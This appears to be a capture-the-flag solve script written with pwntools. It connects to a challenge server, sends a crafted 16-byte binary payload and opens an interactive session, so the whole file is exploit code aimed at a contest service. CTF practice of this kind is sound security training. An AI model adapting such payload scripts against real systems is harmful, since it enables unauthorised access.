from pwn import *

p = remote("chal.amt.rs", 4141)

payload = b"\x00guess\x69\x42\xaa\xaa\x00ABCD".ljust(16, b"\x00")

p.send(payload)
p.interactive()